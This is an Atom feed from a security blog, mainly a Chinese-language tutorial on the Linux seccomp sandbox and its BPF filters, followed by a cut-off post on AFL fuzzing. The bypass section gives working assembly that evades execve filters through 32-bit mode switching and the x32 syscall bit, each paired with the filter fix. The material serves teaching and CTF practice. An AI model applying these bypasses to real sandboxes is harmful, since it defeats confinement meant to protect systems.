<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B3ale</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.b3ale.cn/"/>
  <updated>2020-04-18T14:06:33.120Z</updated>
  <id>blog.b3ale.cn/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux Sandbox - Seccomp</title>
    <link href="blog.b3ale.cn/2020/04/17/Linux-Sandbox-Seccomp/"/>
    <id>blog.b3ale.cn/2020/04/17/Linux-Sandbox-Seccomp/</id>
    <published>2020-04-17T02:21:52.000Z</published>
    <updated>2020-04-18T14:06:33.120Z</updated>
    
    <content type="html"><![CDATA[<p>Seccomp（Secure Computing mode）是 Andrea Arcangeli 在 2005 年设计的，其目的是解决 grid computing 中的安全问题，比如你打算出租你的 CPU 资源，但又担心不可信的代码会破坏你的系统。那么，Seccomp 则可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p><a id="more"></a><h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp 是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p><p>Seccomp 本身是一种很安全的技术，但是在 <code>SECCOMP_SET_MODE_FILTER</code> 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。</p><ul><li>限制一个程序能够使用的系统调用，可以是黑名单或白名单；</li><li>根据 Filter 的内容决定遇到系统调用时采取的行为，包括 kill、allow、trap 等等；</li><li>Filter 可以做简单的计算、条件判断。</li></ul><blockquote><p>早期直接使用 <code>prctl</code> 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 <code>seccomp_init</code>、<code>seccomp_rule_add</code>、<code>seccomp_load</code> 来设定规则。</p></blockquote><h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 CAP_SYS_ADMIN 权限（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 CAP_SYS_ADMIN 的权限。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。有了 CAP_SYS_ADMIN 权限后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p><pre><code class="cpp">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog); // 开启自定义的过滤规则</code></pre><p>接下来看看 <code>prog</code> 对应的结构体 <code>sock_fprog</code> 以及用于过滤系统调用的结构体 <code>sock_filter</code>，主要定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/filter.h" target="_blank" rel="noopener">include/uapi/linux/filter.h</a>（<code>/usr/include/linux/filter.h</code>）中。其中 <code>sock_fprog</code> 第一个成员 <code>len</code> 记录过滤规则的个数；第二个成员 <code>filter</code> 是一个 <code>sock_filter</code> 数组，用于记录相应的过滤规则：</p><pre><code class="cpp">/* *    Try and keep these values and structures similar to BSD, especially *    the BPF code definitions which need to match so you can share filters */struct sock_filter {    /* Filter block */    __u16    code;   /* Actual filter code */    __u8    jt;    /* Jump true */    __u8    jf;    /* Jump false */    __u32    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter __user *filter;};</code></pre><p>为了方便操作 <code>sock_filter</code>，还定义了一组宏：</p><pre><code class="cpp">/* * Macros for filter block array initializers. */#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }#endif</code></pre><p>其中在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/bpf_common.h" target="_blank" rel="noopener">include/uapi/linux/bpf_common.h</a>（<code>/usr/include/linux/bpf_common.h</code>）对 code 进行了一系列的定义，包括一些数据操作指令、跳转指令、算术运算指令等等（Winesap 提到程序可以全部用 BPF 的算术运算单元来实现，运行的时间是算在内核里，据说居然可以在 OJ 里绕过时间限制）：</p><pre><code class="cpp">/* Instruction classes */#define BPF_CLASS(code) ((code) &amp; 0x07)#define        BPF_LD        0x00#define        BPF_LDX        0x01#define        BPF_ST        0x02#define        BPF_STX        0x03#define        BPF_ALU        0x04#define        BPF_JMP        0x05#define        BPF_RET        0x06#define        BPF_MISC        0x07/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)#define        BPF_W        0x00#define        BPF_H        0x08#define        BPF_B        0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)#define        BPF_IMM        0x00#define        BPF_ABS        0x20#define        BPF_IND        0x40#define        BPF_MEM        0x60#define        BPF_LEN        0x80#define        BPF_MSH        0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)#define        BPF_ADD        0x00#define        BPF_SUB        0x10#define        BPF_MUL        0x20#define        BPF_DIV        0x30#define        BPF_OR        0x40#define        BPF_AND        0x50#define        BPF_LSH        0x60#define        BPF_RSH        0x70#define        BPF_NEG        0x80#define        BPF_MOD        0x90#define        BPF_XOR        0xa0#define        BPF_JA        0x00#define        BPF_JEQ        0x10#define        BPF_JGT        0x20#define        BPF_JGE        0x30#define        BPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)#define        BPF_K        0x00#define        BPF_X        0x08</code></pre><p>从某个地址加载数据（数据的大小：<code>BPF_W</code>、<code>BPF_H</code>、<code>BPF_B</code>，地址的类型：<code>BPF_ABS</code>、<code>BPF_IMM</code>）：</p><pre><code class="cpp">BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0)</code></pre><p>然后 Seccomp 的返回值在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中有定义，意思也是比较直观的：</p><pre><code class="cpp">/* * All BPF programs must return a 32-bit value. * The bottom 16-bits are for optional return data. * The upper 16-bits are ordered from least permissive values to most. * * The ordering ensures that a min_t() over composed return values always * selects the least permissive choice. */#define SECCOMP_RET_KILL    0x00000000U /* kill the task immediately */#define SECCOMP_RET_TRAP    0x00030000U /* disallow and force a SIGSYS */#define SECCOMP_RET_ERRNO    0x00050000U /* returns an errno */#define SECCOMP_RET_TRACE    0x7ff00000U /* pass to a tracer or disallow */#define SECCOMP_RET_ALLOW    0x7fff0000U /* allow */</code></pre><p>Seccomp 编写规则时会使用到一个 <code>seccomp_data</code> 结构体，定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中。各个成员如下：</p><ul><li><code>nr</code>：系统调用号；</li><li><code>arch</code>：定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/audit.h" target="_blank" rel="noopener">include/uapi/linux/audit.h</a>（<code>/usr/include/linux/audit.h</code>）中；<ul><li><code>i386</code>：0x40000003；</li><li><code>amd64</code>：0xc000003e。</li></ul></li><li><code>instruction_pointer</code>：系统调用号对应的 IP；</li><li><code>args</code>：系统调用号。<ul><li><code>i386</code>：ebx、ecx、edx、esi、edi；</li><li><code>amd64</code>：rdi、rsi、rdx、r10、r8、r9。</li></ul></li></ul><pre><code class="cpp">#define AUDIT_ARCH_I386        (EM_386|__AUDIT_ARCH_LE)#define AUDIT_ARCH_IA64        (EM_IA_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)/** * struct seccomp_data - the format the BPF program executes over. * @nr: the system call number * @arch: indicates system call convention as an AUDIT_ARCH_* value *        as defined in &lt;linux/audit.h&gt;. * @instruction_pointer: at the time of the system call. * @args: up to 6 system call arguments always stored as 64-bit values *        regardless of the architecture. */struct seccomp_data {    int nr;    __u32 arch;    __u64 instruction_pointer;    __u64 args[6];};</code></pre><p>下面给一个例子测试，<code>SECCOMP_RET_ALLOW</code> 表示允许所有调用；<code>SECCOMP_RET_KILL</code> 表示禁止所有调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;int main() {    struct sock_filter filter[] = {//        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);}</code></pre><p><code>SECCOMP_RET_ALLOW</code> 会正常执行，而 <code>SECCOMP_RET_KILL</code> 会报“invalid system call”：</p><pre><code class="bash">➜  seccomp ./sec[1]    3372 invalid system call  ./sec</code></pre><p>禁用 execve 系统调用的规则如下。首先取出 <code>seccomp_data</code> 中的 <code>nr</code>，然后和 59 比较。如果相等，则跳过一条规则，即被 kill；不相等的话，继续执行下一条规则，即 allow：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // compare nr with 59 (SYS_execve = 59)    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><p>Seccomp 的过滤规则可以通过 gdb 来 dump 出来，即第二次调用 prctl 时的第三个参数：</p><pre><code>(gdb) p/x $rdx$1 = 0x7fffffffe480(gdb) x/2gx 0x7fffffffe4800x7fffffffe480:    0x00007fffffff0004    0x00007fffffffe490(gdb) x/4gx 0x00007fffffffe4900x7fffffffe490:    0x0000000000000020    0x0000003b000100150x7fffffffe4a0:    0x7fff000000000006    0x0000000000000006(gdb) dump memory dd 0x00007fffffffe490 0x00007fffffffe490+4*8</code></pre><p>然后使用 libseccomp 中的 scmp_bpf_disasm 反编译获取大致的过滤规则，通常需要根据反编译出来的结果去查找对应函数的意义：</p><pre><code class="bash">➜  seccomp scmp_bpf_disasm &lt; dd line  OP   JT   JF   K================================= 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4] 0001: 0x15 0x00 0x03 0xc000003e   jeq 3221225534 true:0002 false:0005 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0] 0003: 0x15 0x01 0x00 0x0000003b   jeq 59   true:0005 false:0004 0004: 0x06 0x00 0x00 0x7fff0000   ret ALLOW 0005: 0x06 0x00 0x00 0x00000000   ret KILL</code></pre><p>使用 seccomp-tools 也可以进行解析。</p><h2 id="Seccomp-using-libseccomp"><a href="#Seccomp-using-libseccomp" class="headerlink" title="Seccomp using libseccomp"></a>Seccomp using libseccomp</h2><blockquote><p>根据 veritas501 的博客做的一些记录。</p></blockquote><p>这边需要先安装一些依赖才会有 <code>seccomp.h</code> 头文件：</p><pre><code class="bash">sudo apt-get install libseccomp-dev libseccomp2 seccomp</code></pre><p>具体在 <code>/usr/include/seccomp.h</code> 中，一些选项如下：</p><pre><code class="cpp">/* * seccomp actions *//** * Kill the process */#define SCMP_ACT_KILL           0x00000000U/** * Throw a SIGSYS signal */#define SCMP_ACT_TRAP           0x00030000U/** * Return the specified error code */#define SCMP_ACT_ERRNO(x)       (0x00050000U | ((x) &amp; 0x0000ffffU))/** * Notify a tracing process with the specified value */#define SCMP_ACT_TRACE(x)       (0x7ff00000U | ((x) &amp; 0x0000ffffU))/** * Allow the syscall to be executed */#define SCMP_ACT_ALLOW          0x7fff0000U</code></pre><p><code>seccomp_init()</code> 用于初始化过滤状态：</p><pre><code class="cpp">/** * Initialize the filter state * @param def_action the default filter action * * This function initializes the internal seccomp filter state and should * be called before any other functions in this library to ensure the filter * state is initialized.  Returns a filter context on success, NULL on failure. * */scmp_filter_ctx seccomp_init(uint32_t def_action);</code></pre><p><code>seccomp_rule_add()</code> 用于添加新的规则。其中如果 <code>arg_cnt</code> 不为 0，那么 <code>arg_cnt</code> 表示后面限制的参数的个数，故只有参数满足要求时才会拦截：</p><pre><code class="cpp">/** * Add a new rule to the filter * @param ctx the filter context * @param action the filter action * @param syscall the syscall number * @param arg_cnt the number of argument filters in the argument filter chain * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended) * * This function adds a series of new argument/value checks to the seccomp * filter for the given syscall; multiple argument/value checks can be * specified and they will be chained together (AND&#39;d together) in the filter. * If the specified rule needs to be adjusted due to architecture specifics it * will be adjusted without notification.  Returns zero on success, negative * values on failure. * */int seccomp_rule_add(scmp_filter_ctx ctx,                     uint32_t action, int syscall, unsigned int arg_cnt, ...);** * Specify an argument comparison struct for use in declaring rules * @param arg the argument number, starting at 0 * @param op the comparison operator, e.g. SCMP_CMP_* * @param datum_a dependent on comparison * @param datum_b dependent on comparison, optional */#define SCMP_CMP(...)           ((struct scmp_arg_cmp){__VA_ARGS__})/** * Specify an argument comparison struct for argument 0 */#define SCMP_A0(...)            SCMP_CMP(0, __VA_ARGS__)/** * Specify an argument comparison struct for argument 1 */#define SCMP_A1(...)            SCMP_CMP(1, __VA_ARGS__)/** * Specify an argument comparison struct for argument 2 */#define SCMP_A2(...)            SCMP_CMP(2, __VA_ARGS__)/** * Specify an argument comparison struct for argument 3 */#define SCMP_A3(...)            SCMP_CMP(3, __VA_ARGS__)/** * Specify an argument comparison struct for argument 4 */#define SCMP_A4(...)            SCMP_CMP(4, __VA_ARGS__)/** * Specify an argument comparison struct for argument 5 */#define SCMP_A5(...)            SCMP_CMP(5, __VA_ARGS__)/** * Comparison operators */enum scmp_compare {        _SCMP_CMP_MIN = 0,        SCMP_CMP_NE = 1,                /**&lt; not equal */        SCMP_CMP_LT = 2,                /**&lt; less than */        SCMP_CMP_LE = 3,                /**&lt; less than or equal */        SCMP_CMP_EQ = 4,                /**&lt; equal */        SCMP_CMP_GE = 5,                /**&lt; greater than or equal */        SCMP_CMP_GT = 6,                /**&lt; greater than */        SCMP_CMP_MASKED_EQ = 7,         /**&lt; masked equality */        _SCMP_CMP_MAX,};/** * Argument datum */typedef uint64_t scmp_datum_t;/** * Argument / Value comparison definition */struct scmp_arg_cmp {        unsigned int arg;       /**&lt; argument number, starting at 0 */        enum scmp_compare op;   /**&lt; the comparison op, e.g. SCMP_CMP_* */        scmp_datum_t datum_a;        scmp_datum_t datum_b;};</code></pre><p><code>seccomp_load()</code> 用来应用规则：</p><pre><code class="cpp">/** * Loads the filter into the kernel * @param ctx the filter context * * This function loads the given seccomp filter context into the kernel.  If * the filter was loaded correctly, the kernel will be enforcing the filter * when this function returns.  Returns zero on success, negative values on * error. * */int seccomp_load(const scmp_filter_ctx ctx);</code></pre><p>同样用最简单的例子测试一下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_ALLOW);    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);    seccomp_load(ctx);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);    execve(args[0], args, 0);    return 0;}</code></pre><p>测试发现这里对 system 没有提示，直接过滤了，对 execve 会提示“invalid system call”。不过具体的功能是一样的：</p><pre><code class="bash">➜  seccomp ./sec###[1]    5480 invalid system call  ./sec</code></pre><h1 id="Bypass-Seccomp"><a href="#Bypass-Seccomp" class="headerlink" title="Bypass Seccomp"></a>Bypass Seccomp</h1><p>一般来说 64 位下的 Seccomp 会和前面的一样直接禁掉某个调用号。这种情况有一些方法可以对其绕过。</p><h2 id="绕过没有检查架构（arch）"><a href="#绕过没有检查架构（arch）" class="headerlink" title="绕过没有检查架构（arch）"></a>绕过没有检查架构（arch）</h2><p>一般题目里至少有 <code>SYS_mmap</code> 或 <code>SYS_mprotect</code> 能用，所以通常有机会执行任意 shellcode。通过下面的函数可以在 x86 和 x86_64 之间切换。<code>retf</code> 相当于 <code>POP IP</code> 和 <code>POP CS</code> 两条指令，而 32 位下 CS 为 0x23；64 位下 CS 为 0x33：</p><pre><code class="nasm">to32:    mov DWORD [rsp + 4], 0x23    retfto64:    mov DWORD [esp + 4], 0x33    retf</code></pre><p>假如程序的过滤规则和上面的一样，我们编写一个 <code>my_execve</code> 来调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;extern void my_execve(void *, void *, void *);char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    struct sock_filter filter[] = {        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr        BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    my_execve(args[0], args, 0);}</code></pre><p><code>my_execve</code> 实现如下，因为 32 位下栈会少一半，所以为了防止程序 crash 需要搬一下栈：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    lea rsp, [stack]    call to32    mov eax, 11    mov ebx, edi    mov ecx, esi    int 0x80    retto32:    mov DWORD [rsp + 4], 0x23    retfsection .bss    resb 0x400stack:</code></pre><p>这样就可以成功执行 ls（如果开 sh 的话也没有办法执行命令的，因为 seccomp 的规则会在进程间继承）：</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>限制办法就是添加对 arch 的检查：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有过滤-X32-SYSCALL-BIT"><a href="#没有过滤-X32-SYSCALL-BIT" class="headerlink" title="没有过滤 __X32_SYSCALL_BIT"></a>没有过滤 <code>__X32_SYSCALL_BIT</code></h2><ul><li>在 x86_64 下的一种特殊模式，使用 64 位寄存器和 32 位地址。</li><li>x32 中 <code>nr</code> 会加 <code>__X32_SYSCALL_BIT</code>（0x40000000），见 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/unistd.h" target="_blank" rel="noopener">include/uapi/asm/unistd.h</a>（<code>/usr/include/asm/unistd_x32.h</code>）</li><li>原本的系统调用号加上 0x40000000 是一样的效果</li></ul><p>把 my_execve 修改如下：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    mov rax, 59 + 0x40000000    syscall</code></pre><p>同样可以正常执行</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>添加对系统调用号的检查来进行限制：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 4), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JSET, 0x40000000, 2, 0), // nr &amp; 0x40000000    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有道理的绕过方法"><a href="#没有道理的绕过方法" class="headerlink" title="没有道理的绕过方法"></a>没有道理的绕过方法</h2><ul><li>部分调用号是给 x32 用的，但在 x86_64 下一样能用</li><li>59、520、59+0x40000000、520+0x40000000 都是 execve</li></ul><h1 id="Binary-Test"><a href="#Binary-Test" class="headerlink" title="Binary Test"></a>Binary Test</h1><p>使用 seccomp-tools 对一些题目进行测试。</p><h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw-orw"></a>pwnable.tw-orw</h2><p>这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：</p><pre><code class="bash">$ seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>可以看到先是检查了 arch 必须是 32 位，然后系统调用只允许 rt_sigreturn、sigreturn、exit_group、exit、open、read、write。</p><h2 id="0CTF-2018-mathgame"><a href="#0CTF-2018-mathgame" class="headerlink" title="0CTF-2018-mathgame"></a>0CTF-2018-mathgame</h2><p>这道题也是限制了 arch 和一些调用：</p><pre><code class="bash">$ seccomp-tools dump ./mathgameStarting system, please wait...System started! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A = sys_number 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0030: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>TODO:</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Seccomp（Secure Computing mode）是 Andrea Arcangeli 在 2005 年设计的，其目的是解决 grid computing 中的安全问题，比如你打算出租你的 CPU 资源，但又担心不可信的代码会破坏你的系统。那么，Seccomp 则可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing to Exploit</title>
    <link href="blog.b3ale.cn/2020/04/13/%5BTODO%5DFuzzing-to-Exploit/"/>
    <id>blog.b3ale.cn/2020/04/13/%5BTODO%5DFuzzing-to-Exploit/</id>
    <published>2020-04-13T11:06:40.000Z</published>
    <updated>2020-04-16T09:42:19.306Z</updated>
    
    <content type="html"><![CDATA[<p>AFL Fuzz 初体验。</p><a id="more"></a><blockquote><p>“Fuzzing is a Black Box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.”</p></blockquote><h1 id="American-Fuzzy-Lop"><a href="#American-Fuzzy-Lop" class="headerlink" title="American Fuzzy Lop"></a>American Fuzzy Lop</h1><p>AFL（American Fuzzy Lop）是由安全研究员 Michal Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><ol><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）；</li><li>将队列中的文件按一定的策略进行“突变”；</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中；</li><li>上述过程会一直循环进行，期间触发了 crash 的文件会被记录下来。</li></ol><p><img src="/pics/Fuzzing-to-Exploit/1.png" srcset="/img/loading.gif" alt></p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>安装 AFL 的方式和一般源码编译的程序一样。其中 AFL 的 QEMU 模式常用于黑盒测试。但是因为 AFL 使用的 QEMU 版本太旧，<code>util/memfd.c</code> 中定义的函数 <code>memfd_create()</code> 会和 glibc 中的同名函数冲突，AFL 在 qemu_mode 文件夹下提供了一个脚本 build_qemu_support.sh，用于 patch 一个新的 QEMU。安装完成后，可以看到有以下这些命令：</p><pre><code class="bash">➜  afl-2.52b afl-afl-analyze     afl-clang++     afl-fuzz        afl-gcc         afl-plot        afl-showmap     afl-whatsupafl-clang       afl-cmin        afl-g++         afl-gotcpu      afl-qemu-trace  afl-tmin</code></pre><p>记录几个常用的命令：</p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>afl-analyze</code></td><td style="text-align:center">以指定输入为基础对程序进行分析识别出程序合法输入的轮廓</td></tr><tr><td 